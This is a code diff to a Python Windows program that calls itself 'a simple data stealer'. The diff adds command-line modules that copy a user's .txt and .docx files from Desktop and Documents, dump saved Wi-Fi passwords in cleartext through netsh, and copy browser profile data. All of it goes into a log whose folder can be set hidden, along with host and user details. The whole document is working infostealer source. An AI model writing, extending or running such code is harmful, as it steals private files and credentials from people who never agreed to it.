@@ -4,8 +4,7 @@ import os, fnmatch, socket, getpass, shutil, datetime, ctypes, platform, locale,
 from time import strftime
 from shutil import copyfile
 try:
-	if "-h" not in str(sys.argv):
-		os.system("cls")
+	if "all" in str(sys.argv) or "documents" in str(sys.argv) or "wifi" in str(sys.argv) or "browsers" in str(sys.argv):
 		windll = ctypes.windll.kernel32
 		lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
 		encoding = locale.getpreferredencoding()
@@ -16,13 +15,12 @@ try:
 		hostname = socket.gethostname()
 		path = os.getcwd()
 		lip = socket.gethostbyname(socket.gethostname())
-		timedate = "{~} " + timedate
-		dirname = user + "_" + time
 		prefix = "{~}"
+		timedate = prefix + " " + timedate
+		dirname = user + "_" + time
 		
 		dio = path + "\\" + dirname
 		os.makedirs(dio)
-		os.makedirs(dio + "\\Documents")
 
 		def find(pattern, path, pok):
 			global result
@@ -38,17 +36,18 @@ try:
 						except shutil.SameFileError:
 							duplicate += 1
 
-		find("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
-		res1t = "%.2i" % result
-		find("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
-		res2t = "%.2i" % result
-		find("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
-		res1w = "%.2i" % result
-		find("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
-		res2w = "%.2i" % result
-		resst = int(res1t) + int(res2t)
-		ressw = int(res1w) + int(res2w)
-
+		if "all" in str(sys.argv) or "documents" in str(sys.argv):
+			os.makedirs(dio + "\\Documents")
+			find("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
+			res1t = "%.2i" % result
+			find("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
+			res2t = "%.2i" % result
+			find("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
+			res1w = "%.2i" % result
+			find("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
+			res2w = "%.2i" % result
+			resst = int(res1t) + int(res2t)
+			ressw = int(res1w) + int(res2w)
 
 		logfile = open(dio + "\\" + user + "-log" + ".json", "w")
 		logfile.write("""
@@ -68,7 +67,7 @@ try:
 	hostname: {2}
 	username: {3}
 	local ip: {4}
-	""".format(timedate, typeos, hostname, user, lip))
+""".format(timedate, typeos, hostname, user, lip))
 
 		if "-q" not in str(sys.argv):
 			print("""
@@ -87,15 +86,16 @@ try:
 			print("	hostname: ", hostname)
 			print(" 	username: ", user)
 			print(" 	local ip: ", lip)
-			print(" 	{~} found .txt: ", resst)
-			print(" 	{~} found .docx: ", ressw)
+			if "all" in str(sys.argv) or "documents" in str(sys.argv):
+				print(" 	{~} found .txt: ", resst)
+				print(" 	{~} found .docx: ", ressw)
 
 		def networkpass(one, two):
 			try:
 				cost = 0
 				data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(encoding).split('\n')
 				profiles = [i.split(":")[1][1:-1] for i in data if one in i]
-				logfile.write("Wi-Fi's [\n")
+				logfile.write("	Wi-Fi's [\n")
 				for i in profiles:
 					results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(encoding).split('\n')
 					results = [b.split(":")[1][1:-1] for b in results if two in b]
@@ -111,12 +111,13 @@ try:
 				if "-q" not in str(sys.argv):
 					print(" 	{0} found {1} network/s password/s".format(prefix, cost))
 
-		if lang == "en_US":
-			networkpass("All User Profile", "Key Content")
-			logfile.write("	]")
-		elif lang == "ru_RU":
-			networkpass("Все профили пользователей", "Содержимое ключа")
-			logfile.write("	]")
+		if "all" in str(sys.argv) or "wifi" in str(sys.argv):
+			if lang == "en_US":
+				networkpass("All User Profile", "Key Content")
+				logfile.write("	]\n")
+			elif lang == "ru_RU":
+				networkpass("Все профили пользователей", "Содержимое ключа")
+				logfile.write("	]\n")
 
 		def browsers():
 			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
@@ -354,16 +355,16 @@ try:
 				except OSError:
 					if "-q" not in str(sys.argv):
 						print(" 	{+} Torch")
-
-			if "-q" not in str(sys.argv):
-				print(")")
-		browsers()
-		logfile.write("\n)")
+		
+		if "all" in str(sys.argv) or "browsers" in str(sys.argv):
+			browsers()
+		logfile.write(")")
 		logfile.close()
 		if "-xh" in str(sys.argv):
 			ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
-	elif "-h" in str(sys.argv):
-		os.system("cls")
+		if "-q" not in str(sys.argv):
+			print(")")
+	else:
 		print("""
 	 ___      ___   __     __   ___   _______        __      
 	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
@@ -376,6 +377,13 @@ try:
 		a simple data stealer.
 
 Usage: mikra.exe [-h] [-xh] [-q]
+		 {all, documents, wifi, browsers}
+
+Positional arguments:
+ all		Launches all modules
+ documents	Launches documents module
+ wifi		Launches wifi module
+ browsers	Launches browsers module
 
 Optional arguments:
  -h		Show help.
@@ -383,5 +391,4 @@ Optional arguments:
  -xh		Set hidden attribute to mikra dir.
 		""")
 except KeyboardInterrupt:
-	os.system("cls")
 	os._exit(0)
